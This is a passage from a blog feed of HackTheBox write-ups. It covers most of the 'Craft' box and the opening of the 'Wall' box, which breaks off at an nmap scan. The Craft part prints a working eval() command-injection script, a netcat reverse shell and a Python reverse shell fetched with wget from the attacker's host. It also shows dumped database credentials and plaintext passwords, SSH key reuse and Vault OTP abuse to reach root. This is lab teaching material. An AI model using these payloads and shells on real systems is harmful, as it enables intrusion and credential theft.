class="string">"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZGluZXNoIiwiZXhwIjoxNTcxNTc5ODMwfQ.JpQJlqqc_pYA6Pd3ILx4zDOaXSPYwJ6yMELyIWXDDCE"</span>&#125;</span><br><span class="line">[hg8@archbook ~]$ curl -H <span class="string">"X-Craft-Api-Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZGluZXNoIiwiZXhwIjoxNTcxNTc5ODMwfQ.JpQJlqqc_pYA6Pd3ILx4zDOaXSPYwJ6yMELyIWXDDCE"</span>  <span class="string">"https://api.craft.htb/api/auth/check"</span> -k</span><br><span class="line">&#123;<span class="string">"message"</span>:<span class="string">"Token is valid!"</span>&#125;</span><br></pre></td></tr></table></figure><p>We are authenticated! Note here that this API doesn’t use the usual <code>Authorization: Bearer &lt;token&gt;</code> header but a custom header in the format <code>X-Craft-Api-Token: &lt;token&gt;</code>. It can be easy to overlook this one, that’s why taking time to read the code and understanding the inner workings of the app is important.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># craft_api/api/auth/endpoints/auth.py</span></span><br><span class="line">token = request.headers[<span class="string">'X-Craft-Api-Token'</span>]</span><br></pre></td></tr></table></figure><p>We have now all the needed information to perform our command injection :)</p><p>Since we need to authenticate and perform multiple queries on the <code>/brew</code> endpoint it’s better to write a script instead of having to do a thousand of curl request.</p><p>No need to start from scratch since <code>craft-api/tests/test.py</code> already provide a solid base. I tweaked it a little to end up with this script:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line">urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)</span><br><span class="line"></span><br><span class="line">response = requests.get(<span class="string">'https://api.craft.htb/api/auth/login'</span>,  auth=(<span class="string">'dinesh'</span>, <span class="string">'4aUh0A8PbVJxgd'</span>), verify=<span class="literal">False</span>)</span><br><span class="line">json_response = json.loads(response.text)</span><br><span class="line">token = json_response[<span class="string">'token'</span>]</span><br><span class="line"></span><br><span class="line">headers = &#123;<span class="string">'X-Craft-API-Token'</span>: token, <span class="string">'Content-Type'</span>: <span class="string">'application/json'</span>&#125;</span><br><span class="line"></span><br><span class="line">response = requests.get(<span class="string">'https://api.craft.htb/api/auth/check'</span>, headers=headers, verify=<span class="literal">False</span>)</span><br><span class="line">print(response.text)  <span class="comment"># make sure token is valid</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    cmd = input(<span class="string">'&gt; '</span>)</span><br><span class="line"></span><br><span class="line">    brew_dict = &#123;&#125;</span><br><span class="line">    brew_dict[<span class="string">'abv'</span>] = <span class="string">'__import__("os").popen("&#123;&#125;").read()'</span>.format(cmd)</span><br><span class="line">    brew_dict[<span class="string">'name'</span>] = <span class="string">'bullshit'</span></span><br><span class="line">    brew_dict[<span class="string">'brewer'</span>] = <span class="string">'bullshit'</span></span><br><span class="line">    brew_dict[<span class="string">'style'</span>] = <span class="string">'bullshit'</span></span><br><span class="line">    </span><br><span class="line">    json_data = json.dumps(brew_dict)</span><br><span class="line">    response = requests.post(<span class="string">'https://api.craft.htb/api/brew/'</span>, headers=headers, data=json_data, verify=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure><p>Since <code>eval()</code> will run any python code we will use this lambda function <code>__import__(&quot;os&quot;).popen(&quot;CMD&quot;).read()</code> to run an OS command from the python code.</p><p>I added an <code>input(&#39;&gt; &#39;)</code> so we simply have to type our command to run it on the API. Shell style.</p><p>Unfortunately we don’t have any output available, so how are we going to know that our command executed successfully ?</p><p>With time-based injection ;)</p><p>We are going to inject a <code>sleep 3</code> command at each run:</p><ul><li>If the API hang for 3 seconds, it means our command got executed successfully</li><li>If the API respond immediately, the injection failed.</li></ul><p>Using the <code>requests</code> library <code>elapsed.total_seconds()</code> function, we can display the time elapsed for the request to success.</p><p>I add it to the script so we can easily see if the <code>sleep 5</code> injection worked fine.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[...]</span><br><span class="line">print(<span class="string">"Execution time: &#123;&#125;"</span>.format(response.elapsed.total_seconds()))</span><br></pre></td></tr></table></figure><p>Let’s it give a try:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ python test.py</span><br><span class="line">&#123;<span class="string">"message"</span>:<span class="string">"Token is valid!"</span>&#125;</span><br><span class="line"></span><br><span class="line">&gt; <span class="built_in">test</span></span><br><span class="line">Execution time: 0.147798</span><br><span class="line">&gt; sleep 3</span><br><span class="line">Execution time: 3.158874</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure><p>Looks like it works fine ! Let’s tweak our script a bit to be more comfortable to use:</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="deletion">- brew_dict['abv'] = '__import__("os").popen("&#123;&#125;").read()'.format(cmd)</span></span><br><span class="line"><span class="addition">+ brew_dict['abv'] = '__import__("os").popen("&#123;&#125; &amp;&amp; sleep 3").read()'.format(cmd)</span></span><br></pre></td></tr></table></figure><p>The usage of <code>&amp;&amp; sleep 3</code> means that the sleep command will only get executed if the first command succeeded. This technique will allow us to blindly learn about the box environment.</p><p>Here is an example to illustrate:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ python test.py</span><br><span class="line">&#123;<span class="string">"message"</span>:<span class="string">"Token is valid!"</span>&#125;</span><br><span class="line"></span><br><span class="line">&gt; curl --<span class="built_in">help</span></span><br><span class="line">Execution time: 0.162407</span><br><span class="line">&gt; wget --<span class="built_in">help</span></span><br><span class="line">Execution time: 3.160078</span><br></pre></td></tr></table></figure><p>Since <code>wget --help</code> command took 3 seconds to execute this means that the command ran fine. While <code>curl --help</code> failed, the <code>sleep 3</code> didn’t start meaning <code>curl</code> is not probably not installed.</p><p>This little trick will allow us to have a valuable feedback to know if our command succeed or fail.</p><p>Let’s try to open our classic reverse shell. Start with our listener:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nc -l -vv -p 8585</span><br><span class="line">Listening on any address 8585</span><br></pre></td></tr></table></figure><p>And launch our test script on the API:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ python test.py</span><br><span class="line">&#123;<span class="string">"message"</span>:<span class="string">"Token is valid!"</span>&#125;</span><br><span class="line"></span><br><span class="line">&gt; nc -e /bin/sh 10.10.10.85 8585</span><br><span class="line">Execution time: 0.218422</span><br><span class="line">&gt; nc --<span class="built_in">help</span></span><br><span class="line">Execution time: 3.412322</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure><p>Oddly enough this is not working, whereas <code>nc</code> seems to be installed. That’s strange but let’s move on to a different type of reverse shell. Since we know for sure that Python is installed let’s use a Python reverse shell.</p><p>To make things easier let’s launch a small http server to host our python reverse shell file:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ cat hg8.py</span><br><span class="line">import socket,subprocess,os;</span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);</span><br><span class="line">s.connect((<span class="string">"10.10.10.85"</span>,8585));</span><br><span class="line">os.dup2(s.fileno(),0);</span><br><span class="line">os.dup2(s.fileno(),1);</span><br><span class="line">os.dup2(s.fileno(),2);</span><br><span class="line">p=subprocess.call([<span class="string">"/bin/sh"</span>,<span class="string">"-i"</span>]);</span><br><span class="line">[hg8@archbook ~]$ python -m http.server</span><br><span class="line">Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...</span><br></pre></td></tr></table></figure><p>And back to our original terminal let’s launch our injection:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ python test.py</span><br><span class="line">&#123;<span class="string">"message"</span>:<span class="string">"Token is valid!"</span>&#125;</span><br><span class="line"></span><br><span class="line">&gt; wget 10.10.10.85:8000/hg8.py -O /tmp/hg8.py</span><br><span class="line">Execution time: 1.15602</span><br><span class="line">&gt; python /tmp/hg8.py</span><br></pre></td></tr></table></figure><p>And surely enough a connection open on our <code>netcat</code> listener:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nc -l -vv -p 8585</span><br><span class="line">Listening on any address 8585</span><br><span class="line">Connection from 10.10.10.110:57154</span><br><span class="line">/opt/app <span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)</span><br></pre></td></tr></table></figure><p><em>Note: Now that we are on the box we can investigate on why our original <code>netcat</code> command wasn’t working. Turn out the <code>netcat</code> version shipped in this box in a Busybox version. The manual state:</em></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">/opt/app <span class="comment"># nc</span></span><br><span class="line">BusyBox v1.29.3 (2019-01-24 07:45:07 UTC) multi-call binary.</span><br><span class="line"></span><br><span class="line">Usage: nc [OPTIONS] HOST PORT  - connect</span><br><span class="line">nc [OPTIONS] -l -p PORT [HOST] [PORT]  - listen</span><br><span class="line"></span><br><span class="line">    -e PROG    Run PROG after connect (must be last)</span><br><span class="line">   [...]</span><br></pre></td></tr></table></figure><p><em>In this version <code>-e</code> option <strong>must be last</strong>. So if we ran <code>nc 10.10.10.85 8585 -e /bin/sh</code> instead of <code>nc -e /bin/sh 10.10.10.85 8585</code> the command would have succeeded perfectly. I tried and it worked. Odd but good to keep in mind for the future.</em></p><h3 id="Pivot-from-docker-container-to-user"><a href="#Pivot-from-docker-container-to-user" class="headerlink" title="Pivot from docker container to user"></a>Pivot from docker container to user</h3><p>Now back to our topic. We got our shell on the API. Unfortunately as you noticed with the <code>id</code> command, it seems like we are in a docker container. We probably won’t go far from here.</p><p>Our best bet might be to retrieve the API secrets to see if we can progress from here.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">/opt/app/craft_api <span class="comment"># cat settings.py</span></span><br><span class="line"><span class="comment"># Flask settings</span></span><br><span class="line">FLASK_SERVER_NAME = <span class="string">'api.craft.htb'</span></span><br><span class="line">FLASK_DEBUG = False  <span class="comment"># Do not use debug mode in production</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Flask-Restplus settings</span></span><br><span class="line">RESTPLUS_SWAGGER_UI_DOC_EXPANSION = <span class="string">'list'</span></span><br><span class="line">RESTPLUS_VALIDATE = True</span><br><span class="line">RESTPLUS_MASK_SWAGGER = False</span><br><span class="line">RESTPLUS_ERROR_404_HELP = False</span><br><span class="line">CRAFT_API_SECRET = <span class="string">'hz66OCkDtv8G6D'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># database</span></span><br><span class="line">MYSQL_DATABASE_USER = <span class="string">'craft'</span></span><br><span class="line">MYSQL_DATABASE_PASSWORD = <span class="string">'qLGockJ6G2J75O'</span></span><br><span class="line">MYSQL_DATABASE_DB = <span class="string">'craft'</span></span><br><span class="line">MYSQL_DATABASE_HOST = <span class="string">'db'</span></span><br><span class="line">SQLALCHEMY_TRACK_MODIFICATIONS = False</span><br></pre></td></tr></table></figure><p>We got the database credentials. Let’s try to dump it for juicy informations:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/opt/app <span class="comment"># mysql</span></span><br><span class="line">/bin/sh: mysql: not found</span><br></pre></td></tr></table></figure><p>Of course, in this jail no <code>mysql</code> available either… Earlier I noticed a database test script. We will edit and use this python script since nothing else is available. </p><p>First, let’s list the tables :</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">import</span> pymysql</span><br><span class="line"><span class="keyword">from</span> craft_api <span class="keyword">import</span> settings</span><br><span class="line"></span><br><span class="line">connection = pymysql.connect(host=settings.MYSQL_DATABASE_HOST,</span><br><span class="line">                             user=settings.MYSQL_DATABASE_USER,</span><br><span class="line">                             password=settings.MYSQL_DATABASE_PASSWORD,</span><br><span class="line">                             db=settings.MYSQL_DATABASE_DB,</span><br><span class="line">                             cursorclass=pymysql.cursors.DictCursor)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">with</span> connection.cursor() <span class="keyword">as</span> cursor:</span><br><span class="line">        sql = <span class="string">"SELECT table_name FROM information_schema.tables;"</span></span><br><span class="line">        cursor.execute(sql)</span><br><span class="line">        result = cursor.fetchall()</span><br><span class="line">        <span class="keyword">for</span> row <span class="keyword">in</span> result:</span><br><span class="line">            print(row)</span><br><span class="line"></span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">    connection.close()</span><br></pre></td></tr></table></figure><p>Running this script will return two tables: <code>brew</code> and <code>users</code>. </p><p>Let’s list the users by editing the <code>dbtest.py</code> script :</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="deletion">- sql = "SELECT table_name FROM information_schema.tables;"</span></span><br><span class="line"><span class="addition">+ sql = "SELECT * FROM user;"</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/opt/app <span class="comment"># python dbtest.py</span></span><br><span class="line">&#123;<span class="string">'id'</span>: 1, <span class="string">'username'</span>: <span class="string">'dinesh'</span>, <span class="string">'password'</span>: <span class="string">'4aUh0A8PbVJxgd'</span>&#125;</span><br><span class="line">&#123;<span class="string">'id'</span>: 4, <span class="string">'username'</span>: <span class="string">'ebachman'</span>, <span class="string">'password'</span>: <span class="string">'llJ77D8QFkLPQB'</span>&#125;</span><br><span class="line">&#123;<span class="string">'id'</span>: 5, <span class="string">'username'</span>: <span class="string">'gilfoyle'</span>, <span class="string">'password'</span>: <span class="string">'ZEU3N8WNM2rh4T'</span>&#125;</span><br></pre></td></tr></table></figure><p>Good, a few users with plain-text passwords. Unfortunately none works on SSH…</p><p>So what remains? Let’s go back to the Gogs instance. Login as <code>gilfoyle</code> gives us access to a very interesting private repository:</p><p><img src="https://user-images.githubusercontent.com/9076747/67162678-94318d80-f366-11e9-9377-04c310d8654a.png" alt="Craft Infra Repository"></p><p>Let’s clone it to explore:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ GIT_SSL_NO_VERIFY=<span class="literal">true</span> git <span class="built_in">clone</span> https://gilfoyle:ZEU3N8WNM2rh4T@gogs.craft.htb/gilfoyle/craft-infra.git</span><br></pre></td></tr></table></figure><p>First thing that catches the eye is the <code>.ssh</code> folder containing both the public and private key. We should be able to use to login as <code>gilfoyle</code> through SSH:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ chmod 600 .ssh/id_rsa</span><br><span class="line">[hg8@archbook ~]$ ssh gilfoyle@craft.htb -i id_rsa</span><br><span class="line"></span><br><span class="line">  .   *   ..  . *  *</span><br><span class="line">*  * @()Ooc()*   o  .</span><br><span class="line">    (Q@*0CG*O()  ___</span><br><span class="line">   |\_________/|/ _ \</span><br><span class="line">   |  |  |  |  | / | |</span><br><span class="line">   |  |  |  |  | | | |</span><br><span class="line">   |  |  |  |  | | | |</span><br><span class="line">   |  |  |  |  | | | |</span><br><span class="line">   |  |  |  |  | | | |</span><br><span class="line">   |  |  |  |  | \_| |</span><br><span class="line">   |  |  |  |  |\___/</span><br><span class="line">   |\_|__|__|_/|</span><br><span class="line">    \_________/</span><br><span class="line"></span><br><span class="line">Enter passphrase <span class="keyword">for</span> key <span class="string">'id_rsa'</span>:</span><br><span class="line">Linux craft.htb 4.9.0-8-amd64 <span class="comment">#1 SMP Debian 4.9.130-2 (2018-10-27) x86_64</span></span><br><span class="line"></span><br><span class="line">Last login: Sun Oct 20 06:26:05 2019 from 10.10.15.50</span><br><span class="line">gilfoyle@craft:~$</span><br></pre></td></tr></table></figure><p>A passphrase is needed for the <code>id_rsa</code> key, fortunately we have a case of password reuse and the password <code>ZEU3N8WNM2rh4T</code> found in the database dump is valid.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gilfoyle@craft:~$ cat user.txt</span><br><span class="line">bxxxxxxxxxxxxxxxxxxxxxxx4</span><br></pre></td></tr></table></figure><h2 id="Root-Flag"><a href="#Root-Flag" class="headerlink" title="Root Flag"></a>Root Flag</h2><h3 id="Recon-1"><a href="#Recon-1" class="headerlink" title="Recon"></a>Recon</h3><p>On user <code>gilfoyle</code> nothing particularly catch the eye and the box seems well configured. </p><p>Upon more enumeration we still notice an uncommon ssh configuration :</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gilfoyle@craft:~$ cat /etc/ssh/sshd_config</span><br><span class="line">[...]</span><br><span class="line">PermitRootLogin yes</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure><p>It looks like our entry door for root flag will be through SSH.</p><p>Inspecting files in the home directory also shows a token that might be useful:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gilfoyle@craft:~$ ls -a</span><br><span class="line">.  ..  .bashrc    .config  .gnupg  .profile  .ssh  user.txt  .vault-token  .viminfo</span><br><span class="line">gilfoyle@craft:~$ cat .vault-token</span><br><span class="line">f1783c8d-41c7-0b12-d1c1-cf2aa17ac6b9</span><br></pre></td></tr></table></figure><p>We notice this is about Vault again, we saw it already mentioned in the <code>craft-infra</code> repository. Let’s dig that way.</p><p>I didn’t know anything about Vault at the time so I checked their website :</p><blockquote><p>Vault is a tool for secrets management, encryption as a service, and privileged access management.<br><a href="https://www.vaultproject.io/" target="_blank" rel="noopener">https://www.vaultproject.io/</a></p></blockquote><p>That sounds really interesting for what we need…</p><h3 id="Exploiting-Vault-for-SSH-root-password"><a href="#Exploiting-Vault-for-SSH-root-password" class="headerlink" title="Exploiting Vault for SSH root password"></a>Exploiting Vault for SSH root password</h3><p>If we put all the puzzle pieces together it seems like this tool is storing either the <code>root</code> account SSH password or a way to access the <code>root</code> account.</p><p>The file <code>craft-infra/src/master/vault/secrets.sh</code> on the <code>craft-infra</code> repository looks promising :</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># set up vault secrets backend</span></span><br><span class="line"></span><br><span class="line">vault secrets <span class="built_in">enable</span> ssh</span><br><span class="line"></span><br><span class="line">vault write ssh/roles/root_otp \</span><br><span class="line">    key_type=otp \</span><br><span class="line">    default_user=root \</span><br><span class="line">    cidr_list=0.0.0.0/0</span><br></pre></td></tr></table></figure><p>It confirms that Vault is used for ssh access to root. <code>key_type=otp</code> seems to mean that it’s working as a one-time password mechanism.</p><p>After a bit of Googling we find this documentation on Vault:</p><blockquote><p>The One-Time SSH Password (OTP) SSH secrets engine type allows a Vault server to issue a One-Time Password every time a client wants to SSH into a remote host using a helper command on the remote host to perform verification.<br><a href="https://www.vaultproject.io/docs/secrets/ssh/one-time-ssh-passwords.html" target="_blank" rel="noopener">https://www.vaultproject.io/docs/secrets/ssh/one-time-ssh-passwords.html</a></p></blockquote><p>Alright, we have all the needed information. Let’s generate a One-Time Password for the root account!</p><p>From here I will follow the documentation linked above. First we need to mount the secrets engine:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gilfoyle@craft:~$ vault secrets <span class="built_in">enable</span> ssh</span><br><span class="line">Successfully mounted <span class="string">'ssh'</span> at <span class="string">'ssh'</span>!</span><br></pre></td></tr></table></figure><p>Then we create a role with the <code>key_type</code> parameter set to <code>otp</code>. I will use the same command than the one in <code>craft-infra/src/master/vault/secrets.sh</code> to make sure we are not missing anything:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gilfoyle@craft:~$ vault write ssh/roles/root_otp \</span><br><span class="line">     key_type=otp \</span><br><span class="line">     default_user=root \</span><br><span class="line">     cidr_list=0.0.0.0/0</span><br><span class="line">Success! Data written to: ssh/roles/root_otp</span><br></pre></td></tr></table></figure><p>Last step we create an OTP credential for an IP of the remote host that belongs to <code>otp_key_role</code>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">gilfoyle@craft:~$ vault write ssh/creds/root_otp ip=10.10.10.110</span><br><span class="line">Key                Value</span><br><span class="line">---                -----</span><br><span class="line">lease_id           ssh/creds/root_otp/15c8d88c-4e1a-6ec6-4cbb-616cf25e1a7d</span><br><span class="line">lease_duration     768h</span><br><span class="line">lease_renewable    <span class="literal">false</span></span><br><span class="line">ip                 10.10.10.110</span><br><span class="line">key                3d32eb8a-61b1-3376-4402-dd15e72206f8</span><br><span class="line">key_type           otp</span><br><span class="line">port               22</span><br><span class="line">username           root</span><br></pre></td></tr></table></figure><p>Seems like everything went fine. Let’s launch a new terminal and try to login as <code>root</code> :</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ssh root@craft.htb</span><br><span class="line"></span><br><span class="line">  .   *   ..  . *  *</span><br><span class="line">*  * @()Ooc()*   o  .</span><br><span class="line">    (Q@*0CG*O()  ___</span><br><span class="line">   |\_________/|/ _ \</span><br><span class="line">   |  |  |  |  | / | |</span><br><span class="line">   |  |  |  |  | | | |</span><br><span class="line">   |  |  |  |  | | | |</span><br><span class="line">   |  |  |  |  | | | |</span><br><span class="line">   |  |  |  |  | | | |</span><br><span class="line">   |  |  |  |  | \_| |</span><br><span class="line">   |  |  |  |  |\___/</span><br><span class="line">   |\_|__|__|_/|</span><br><span class="line">    \_________/</span><br><span class="line"></span><br><span class="line">Password:</span><br><span class="line">Linux craft.htb 4.9.0-8-amd64 <span class="comment">#1 SMP Debian 4.9.130-2 (2018-10-27) x86_64</span></span><br><span class="line"></span><br><span class="line">Last login: Sun Oct 20 06:10:03 2019 from 127.0.0.1</span><br><span class="line">root@craft:~<span class="comment"># cat root.txt</span></span><br><span class="line">8xxxxxxxxxxxxxxxxxxx1</span><br></pre></td></tr></table></figure><hr><p>This box was really a fun time and my favorite so far. As always do not hesitate to contact me for any questions or feedback.</p><p>See you next time !</p><p>-hg8</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> HackTheBox </category>
          
          <category> Medium Box </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> git </tag>
            
            <tag> craft </tag>
            
            <tag> gogs </tag>
            
            <tag> api </tag>
            
            <tag> flask </tag>
            
            <tag> python </tag>
            
            <tag> eval </tag>
            
            <tag> vault </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HackTheBox - Wall</title>
      <link href="/posts/wall/"/>
      <url>/posts/wall/</url>
      
        <content type="html"><![CDATA[<img width="582" alt="wall-hackthebox" src="https://user-images.githubusercontent.com/9076747/82158757-0da44680-988a-11ea-8a4f-5a2fb2ff79fb.png"><p>Wall was an interesting box, exploit oriented. The initial foothold was not straight forward to find and took a bit of time to finally figure out.</p><p>First thing first, let’s add the box IP to the hosts file:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ <span class="built_in">echo</span> <span class="string">"10.10.10.157 wall.htb"</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure><p>and let’s start!</p><h2 id="User-Flag"><a href="#User-Flag" class="headerlink" title="User Flag"></a>User Flag</h2><h3 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h3><p>Let’s start with the classic nmap scan:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nmap -sV -sT -sC wall.htb</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-28 16:25 CET</span><br><span class="line">Nmap scan report <span class="keyword">for</span> wall.htb (10.10.10.157)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 